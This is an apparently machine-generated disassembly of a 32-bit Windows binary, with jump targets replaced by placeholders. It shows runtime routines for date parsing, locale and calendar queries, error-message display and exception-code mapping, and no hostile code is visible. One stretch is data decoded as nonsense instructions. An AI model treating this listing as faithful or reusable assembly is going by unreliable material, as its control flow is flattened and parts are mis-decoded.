call sub_40445c
push eax
mov eax [ ebx ]
call sub_40445c
pop edx
call sub_40c6a8
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40aa9c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409c3c
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40aaf8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ae13
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a9b4
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c5e4
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a85c
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40aa00
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_4044bc
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_4081b4
mov eax [ ebp - 0x1c ]
call sub_40aa48
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ae1a
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403fc0
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a97c
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a85c
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a97c
test al al
je r-xdata
call sub_409c3c
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a85c
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_4099b0
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4045a0
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a97c
mov edx ebx
mov eax esi
call sub_40a838
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40425c
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40aa00
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40aa9c
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a838
mov eax esi
call sub_40425c
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409c3c
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_40425c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4044bc
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_408144
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_40425c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4044bc
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_408144
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40ae3c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a8f0
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a8f0
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a8f0
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a85c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a838
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a8f0
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a97c
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a85c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a8f0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a97c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a838
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409868
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a8f0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a85c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a8f0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a97c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a8f0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a85c
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b030
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40aaf8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40425c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b064
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ae3c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40425c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b098
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40aaf8
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b064
mov ebx eax
jmp r-xdata
mov eax esi
call sub_40425c
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40ae3c
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b124
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_40408c
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b170
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403ff0
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_40408c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b1bc
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b1e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b170
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405eac
sub_40b220
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b333
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b1e4
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ff0
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b1e4
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403ff0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b1e4
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403ff0
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b1e4
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403ff0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b33a
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403fc0
retn
sub_40b344
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404194
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b37e
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b3e5
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404194
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_40842c
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3ec
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
inc ebx
sub_40b3f8
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b48f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b170
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_40842c
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b496
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b344
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push r-xdata
call EnumCalendarInfoA
sub_40b4a8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b672
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403f9c
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b170
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_40842c
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_40425c
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b679
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403fc0
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408a44
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c56c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4044bc
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404264
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403ff0
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408a44
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404264
inc ebx
jmp r-xdata
mov eax esi
call sub_40425c
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408a44
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404264
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404264
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404264
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404184
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404264
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404184
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404264
sub_40b6dc
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b6d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c748
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408968
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4053fc
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_40319c
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408f8c
mov eax [ ebp - 0x4 ]
call sub_408904
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_40445c
mov ebx eax
mov eax ebx
call sub_408904
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b864
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b6dc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4053fc
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402aa8
call sub_40291c
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408904
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b938
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403ff0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b974
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b9ce
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408fcc
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b9d5
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
add esp 0xfffffff0
call sub_403570
sub_40b9d5
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b9f4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405eac
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40ba30
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40ba9c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405eac
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408fcc
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40baa3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
add esp 0xfffffff0
call sub_403570
sub_40baa3
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40bac4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403ff0
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40bb38
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402990
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bb98
pushfd
mov ebx 0xa0e0040
push esp
inc ebp
js r-xdata
jge r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bca8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
add al 0x0
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404034
jmp r-xdata
push ebx
mov eax edx
jmp sub_4039d8
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bcaf
lea eax [ ebp - 0x20 ]
call sub_403f9c
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b938
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40bb38
mov edx eax
sub_40bc0c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bca8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404034
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bcaf
lea eax [ ebp - 0x20 ]
call sub_403f9c
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40bcfc
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
